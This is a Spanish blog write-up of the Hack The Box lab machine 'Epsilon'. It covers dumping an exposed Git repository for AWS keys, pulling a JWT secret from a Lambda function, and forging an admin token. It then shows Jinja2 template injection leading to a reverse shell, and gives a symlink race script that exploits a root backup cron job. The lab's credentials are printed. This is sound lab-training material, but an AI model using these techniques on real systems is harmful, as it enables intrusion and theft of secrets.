---
title: "Epsilon"
date: 2022-09-11
description: "Máquina de dificultad media"
type: "post"
tags: ["HTB","Linux"]
showTableOfContents: true
---
![Banner](/images/epsilon/Epsilon.png)
# Enumeración
Escaneo con nmap de todos los puertos
```BASH
└─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss 10.10.11.134
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-11 19:22 EDT
Initiating SYN Stealth Scan at 19:22
Scanning 10.10.11.134 [65535 ports]
Discovered open port 22/tcp on 10.10.11.134
Discovered open port 80/tcp on 10.10.11.134
Discovered open port 5000/tcp on 10.10.11.134
Completed SYN Stealth Scan at 19:22, 18.14s elapsed (65535 total ports)
Nmap scan report for 10.10.11.134
Host is up, received user-set (0.27s latency).
Scanned at 2022-09-11 19:22:07 EDT for 18s
Not shown: 64259 closed tcp ports (reset), 1273 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds
           Raw packets sent: 88744 (3.905MB) | Rcvd: 82145 (3.286MB)
```
Escaneo específico de los puertos encontrados.
```BASH
└─$ nmap -sCV -p 22,80,5000 -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-11 19:26 EDT
Nmap scan report for epsilon.htb (10.10.11.134)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.87 seconds
``` 
De los resultados obtenidos, observamos que tenemos un sitio web realizado en python en el puerto 5000 y en el puerto 80 tenemos lo que parece ser un repositorio de git.

## Puerto 80
En el puerto 80 al intentar acceder a algun directorio nos arrojar un código 301, por lo tanto no podemos ver el contenido del repositorio a simple vista.
```BASH
└─$ curl http://10.10.11.134/.git
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.11.134/.git/">here</a>.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.11.134 Port 80</address>
</body></html>
```
Por lo tanto, solo podemos acceder a archivos directamente como por ejemplo el archivo HEAD.
```BASH
└─$ curl http://10.10.11.134/.git/HEAD
ref: refs/heads/master
```
## Puerto 5000
En este puerto encontramos una página a la cual solo tenemos acceso a un login, intentando bypassear el login con SQLi o con credenciales por defecto no dio ningún resultado :(, entonces seguimos con otros métodos.
![Login](/images/epsilon/epsilon1.png)
Realizando un fuzzeo rápido, encontramos otras paginas las cuales nos redireccionan al login de nuevo y el directorio `/track`, en el cual no podemos hacer mucho.
```BASH
└─$ ffuf -c -ic -w /usr/share/wordlists/dirb/common.txt -u http://10.10.11.134:5000/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.134:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 3550, Words: 522, Lines: 205, Duration: 107ms]
home                    [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 102ms]
order                   [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 102ms]
track                   [Status: 200, Size: 4288, Words: 631, Lines: 234, Duration: 105ms]
:: Progress: [4614/4614] :: Job [1/1] :: 171 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
``` 
# Intrusión

## Repositorio Git
Regresando al puerto 80 para obtener los archivos del repositorio, utilizamos la herramienta `gitdumper` 
```BASH
└─$ ./gitdumper.sh http://10.10.11.134/.git/ repo                                            
###########                                         
# GitDumper is part of https://github.com/internetwache/GitTools                                            
#                                                   
# Developed and maintained by @gehaxelt from @internetwache                                      
#                                         
# Use at your own risk. Usage might be illegal in certain circumstances.                                    
# Only for educational purposes!                                      
###########                                         
[*] Destination folder does not exist
[+] Creating repo/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3
[+] Downloaded: objects/c5/1441640fd25e9fba42725147595b5918eba0f1
[+] Downloaded: objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d
[+] Downloaded: objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0
[+] Downloaded: objects/5c/52105750831385d4756111e1103957ac599d02
[+] Downloaded: objects/b5/f4c99c772eeb629e53d284275458d75ed9a010
[+] Downloaded: objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca
[+] Downloaded: objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8
[+] Downloaded: objects/65/b80f62da28254f67f0bea392057fd7d2330e2d
[+] Downloaded: objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e
[+] Downloaded: objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630
[+] Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca
[+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34
```
Una vez que ya descargamos el  vemos los commits realizados en el repositorio, donde notamos que se actualizó un archivo entre los dos primeros, revisando la diferencia entre estos dos commits encontramos credenciales para conectarnos por medio de aws.
```BASH
└─$ git log --oneline --graph --all
* c622771 (HEAD -> master) Fixed Typo
* b10dd06 Adding Costume Site
* c514416 Updatig Tracking API
* 7cf92a7 Adding Tracking API Module

└─$ git diff c514416 7cf92a7
diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index 545f6fe..fed7ab9 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -5,8 +5,8 @@ from boto3.session import Session
 
 
 session = Session(
-    aws_access_key_id='<aws_access_key_id>',
-    aws_secret_access_key='<aws_secret_access_key>',
+    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
     region_name='us-east-1',
     endpoint_url='http://cloud.epsilong.htb')
 aws_lambda = session.client('lambda')    
```
También si vemos el status, observamos como no se ha hecho el commit para borrar los archivos por lo que es posible recuperarlos con el comando restore, como se muestra a continuación
```BASH
└─$ git status                                              
On branch master                                              
Changes not staged for commit:                                             
  (use "git add/rm <file>..." to update what will be committed)        
  (use "git restore <file>..." to discard changes in working directory)           
        deleted:    server.py               
        deleted:    track_api_CR_148.py                                                           
no changes added to commit (use "git add" and/or "git commit -a") 
└─$ git restore track_api_CR_148.py

└─$ git restore server.py

``` 
En los archivos obtenidos tenemos el código fuente correspondiente a la página localizada en el puerto 5000, de donde posemos recabar que se trata de un servidor realizado en Flask, se usa jwt con una llave secreta (que por el momento desconocemos) para la autenticación por medio de la cookie auth. También es posible encontrar un SSTI en la ruta `/order` la cual podremos explotar una vez tengamos acceso.

```PYTHON
#!/usr/bin/python3

import jwt
from flask import *

app = Flask(__name__)
secret = '<secret_key>'

def verify_jwt(token,key):
    try:
        username=jwt.decode(token,key,algorithms=['HS256',])['username']
        if username:
            return True
        else:
            return False
    except:
        return False
[...]
@app.route('/order',methods=["GET","POST"])
def order():
    if verify_jwt(request.cookies.get('auth'),secret):
        if request.method=="POST":
            costume=request.form["costume"]
            message = '''
            Your order of "{}" has been placed successfully.
            '''.format(costume)
            tmpl=render_template_string(message,costume=costume)
            return render_template('order.html',message=tmpl)
        else:
            return render_template('order.html')
    else:
        return redirect('/',code=302)
[...]
```
Revisando el otro archivo recuperado, obtenemos el nombre del dominio utilizado para conectarse a aws lamda, el cual es `cloud.epsilon.htb`, por lo tanto agregamos este subdominio a nuestro archivo de hosts (`/etc/hosts`).
## AWS Lambda

Con las credenciales previamente encontradas, es posible acceder a la llave secreta utilizada en el JWT.

Lo primero a realizar es colocar las credenciales en nuestro awscli.

```BASH
└─$ aws configure
AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [None]: us-east-1
Default output format [None]:                                 
```
Revisando la página de ayuda de lambda contamos con distintas opciones, de las cuales nos interesa el listar funciones. Para ello la sintaxis es la siguiente: `aws lambda list-functions`, pero en este caso es necesario especificar el url del endpoint debido a que no vamos a conectarnos directamente a los servidores de aws sino a la máquina objetivo.
```BASH
└─$ aws lambda list-functions --endpoint-url "http://cloud.epsilon.htb"
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2022-09-15T04:27:49.044+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "d342c387-f0a9-426b-8fc4-0881bd471b35",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```
*Investigando un poco más sobre lambda sabemos que es posible obtener una reverse shell por medio de las funciones pero en este caso al ser un servicio customizado, no se incluye la opción para ejecutar las funciones, entonces seguimos por otra ruta.*

Entre las opciones disponibles también es posible obtener el código fuente de la función, para eso usamos la opción `get-function`. En la respuesta obtenemos un enlace que nos permite descargar un archivo zip con el código fuente.
```SHELL
└─$ aws lambda get-function --function-name "costume_shop_v1" --endpoint-url "http://cloud.epsilon.htb"
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2022-09-15T04:27:49.044+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "d342c387-f0a9-426b-8fc4-0881bd471b35",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}
└─$ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code -O lambda_archive.zip      
--2022-09-15 00:51:33--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code                         
Resolving cloud.epsilon.htb (cloud.epsilon.htb)... 10.10.11.134              
Connecting to cloud.epsilon.htb (cloud.epsilon.htb)|10.10.11.134|:80... connected.        
HTTP request sent, awaiting response... 200                   
Length: 478 [application/zip]              
Saving to: ‘lambda_archive.zip’                                                                                                            
lambda_archive.zip                              100%[====================================================================================================>]     478  --.-KB/s    in 0.1s         
2022-09-15 00:51:34 (4.88 KB/s) - ‘lambda_archive.zip’ saved [478/478] 
└─$ unzip lambda_archive.zip 
Archive:  lambda_archive.zip
  inflating: lambda_function.py  
```
Al revisar el código fuente encontramos la llave secreta que necesitamos para poder crear nuestro jwt.

```PYTHON
import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
```
## Server Side Template Injection
Con la información recabada en los pasos anteriores es posible acceder a la página en el puerto 5000, para eso es necesario crear nuestro jwt y colocarlo en la cookie `auth`.
*La biblioteca a descargar para el jwt es Pyjwt*
Al observar el código fuente en el archivo `server.py`, vemos que para crear un token, utiliza el atributo username, la llave secreta y utiliza el algoritmo HS256. Entonces podemos crear nuestro token en la terminal interactiva de Python.
```PYTHON
import jwt
secret = 'RrXCv`mrNe!K!4+5`wYq'
jwt.encode({"username":"admin"},secret,algorithm='HS256')
# jwt: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'
```
Colocamos nuestra cookie y listo tenemos acceso a la página.
![Login Bypass](/images/epsilon/auth.png)
Sabemos que existe un SSTI en la ruta `/order`, dirigiendonos a la ruta, vemos que la vulnerabilidad es por medio del parámetro `costume`, el cual es una lista desplegable, para poder ingresar el input que deseamos interceptamos la solicitud por medio de burp y tenemos acceso a la modificación del parámetro, al tratarse de un servidor en Flask sabemos que utiliza Jinja2 para renderizar los template, por lo que, es posible obtener un RCE.
![Jinja2 - RCE](/images/epsilon/ssti.png)
Con lo anterior se tiene acceso a la máquina utilizando una reverse shell.
```SHELL
└─$ nc -lvnp 1234          
listening on [any] 1234 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.134] 45710
tom@epsilon:/var/www/app$ id
id
uid=1000(tom) gid=1000(tom) groups=1000(tom)
tom@epsilon:/var/www/app$ 
```
# Escalación de Privilegios
Al revisar los procesos que se estan ejecutando observamos que hay un cron perteneciente a root.
```SHELL
tom@epsilon:/var/www/app$ ps -aux
[...]
root         744  0.0  0.2 392412 11996 ?        Ssl  04:27   0:00 /usr/lib/udisks2/udisksd
root         861  0.0  0.1 232716  6808 ?        Ssl  04:27   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         913  0.0  0.0   6812  3044 ?        Ss   04:27   0:00 /usr/sbin/cron -f
root         921  0.1  1.2 975768 50368 ?        Ssl  04:27   0:06 /usr/bin/containerd
daemon       923  0.0  0.0   3792  2436 ?        Ss   04:27   0:00 /usr/sbin/atd -f
root         941  0.0  0.0   8352  3436 ?        S    04:27   0:00 /usr/sbin/CRON -f
root         947  0.0  0.0   5828  1864 tty1     Ss+  04:27   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         960  0.0  0.0   2608   612 ?        Ss   04:27   0:00 /bin/sh -c cd /var/www/app;sudo -u tom python3 app.py
root         966  0.0  0.1   9420  4580 ?        S    04:27   0:00 sudo -u tom python3 app.py
[...]
```
Entonces podemos utilizar `pspy` para poder ver los procesos conforme se van ejecutando, vemos que se ejecuta el archivo `/usr/bin/backup.sh`

```SHELL
2022/09/11 20:12:01 CMD: UID=0    PID=5515   | /bin/bash /usr/bin/backup.sh 
2022/09/11 20:12:01 CMD: UID=0    PID=5515   | /bin/sh -c /usr/bin/backup.sh 
2022/09/11 20:12:01 CMD: UID=0    PID=5517   | 
2022/09/11 20:12:01 CMD: UID=0    PID=5519   | /usr/bin/tar -cvf /opt/backups/700198870.tar /var/www/app/ 
2022/09/11 20:12:01 CMD: UID=0    PID=5521   | /bin/bash /usr/bin/backup.sh 
2022/09/11 20:12:01 CMD: UID=0    PID=5520   | sha1sum /opt/backups/700198870.tar 
2022/09/11 20:12:01 CMD: UID=0    PID=5522   | sleep 5 
2022/09/11 20:12:06 CMD: UID=???  PID=5523   | ???
2022/09/11 20:12:06 CMD: UID=0    PID=5524   | /usr/bin/tar -chvf /var/backups/web_backups/710549490.tar /opt/backups/checksum /opt/backups/700198870.tar 
```
Al revisar el archivo tenemos permisos de lectura. Entonces sabemos lo que hace:
* Borra los archivos del directorio `/opt/backups/`
* Comprime el directorio `/var/www/app` con tar y el archivo lo guarda en el directorio `opt/backups/`
* Obtiene el checksum del archivo y lo guarda en `/opt/backups/checksum`
* Comprime en un archivo tar los dos archivos creados anteriormente y lo guarda en el directorio `/var/backups/web_backups/`
* Borra los archivos del directorio `/opt/backups/`
```BASH
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
```
Del contenido lo más destacado es la opción -c`h`vf utilizada en el segundo tar. Esta opción lo que hace es incluir los archivos a los que apunta un enlace simbólico, con esto es posible obtener los archivos del directorio `/root`.

Como tenemos permisos de escritura en el directorio `/opt/backups/`, podemos reemplazar un archivo de los que se comprimen en el segundo tar, por un enlace simbólico que apunte al directorio `/root`. Es posible realizarlo maunalmente esperando a que se creen los archivos, pero en esta ocasión es mejor realizar un script que este esperando la existencia del archivo `/opt/backups/checksum`, una vez detectado el archivo lo elimina y procede a realizar un enlace simbólico hacia el directorio `/root`.
```BASH
#!/bin/bash
flag=true
echo "[+] Waiting cron"
while $flag; do
        if [[ -e "/opt/backups/checksum" ]]; then
                echo "[+] The file exists"
                rm -f /opt/backups/checksum
                echo "[+] File deleted"
                ln -s /root /opt/backups/checksum
                echo "[+] Symlink created"
                flag=false
        fi
done
```
Después de ejecutar el script observamos un tar de mayor tamaño que los anteriores.
```SHELL 
tom@epsilon:/tmp$ ls -la /var/backups/web_backups/               
total 80420                    
drwxr-xr-x 2 root root     4096 Sep 15 06:07 .                         
drwxr-xr-x 3 root root     4096 Sep 15 04:58 ..                          
-rw-r--r-- 1 root root  1003520 Sep 15 06:05 323888649.tar               
-rw-r--r-- 1 root root  1003520 Sep 15 06:06 343435605.tar  
-rw-r--r-- 1 root root 80332800 Sep 15 06:07 437418946.tar  
```
Ya solo es cuestión de descomprimir el archivo tar para obtener los contenidos, donde encontramos credenciales para conectarnos por medio de ssh y la flag de root para completar la máquina.
```SHELL                                                     
tom@epsilon:/tmp$ tar -xf 437418946.tar           
tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted                
tar: Exiting with failure status due to previous errors
tom@epsilon:/tmp/opt/backups/checksum$ ls -la
total 60
drwx------  9 tom tom 4096 Dec 20  2021 .
drwxrwxr-x  3 tom tom 4096 Sep 15 06:08 ..
drwxr-xr-x  2 tom tom 4096 Dec 20  2021 .aws
-rw-r--r--  1 tom tom 3106 Dec  5  2019 .bashrc
drwx------  4 tom tom 4096 Dec 20  2021 .cache
drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .config
-rw-r--r--  1 tom tom  356 Nov 17  2021 docker-compose.yml
-rw-r--r--  1 tom tom   33 Nov 17  2021 .gitconfig
-rwxr-xr-x  1 tom tom  453 Nov 17  2021 lambda.sh
drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .local
drwxr-xr-x 36 tom tom 4096 Sep 15 04:27 .localstack
-rw-r--r--  1 tom tom  161 Dec  5  2019 .profile
-rw-r-----  1 tom tom   33 Sep 15 04:27 root.txt
drwxr-xr-x  2 tom tom 4096 Dec 20  2021 src
drwx------  2 tom tom 4096 Dec 20  2021 .ssh
tom@epsilon:/tmp/opt/backups/checksum$ ls -la .ssh
total 20
drwx------ 2 tom tom 4096 Dec 20  2021 .
drwx------ 9 tom tom 4096 Dec 20  2021 ..
-rw------- 1 tom tom  566 Dec  1  2021 authorized_keys
-rw------- 1 tom tom 2602 Dec  1  2021 id_rsa
-rw-r--r-- 1 tom tom  566 Dec  1  2021 id_rsa.pub
```
# Referencias
[Jinja2 RCE](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Template%20Injection/#jinja2-remote-code-execution)

[AWS Lambda](https://docs.aws.amazon.com/cli/latest/reference/lambda/index.html#cli-aws-lambda)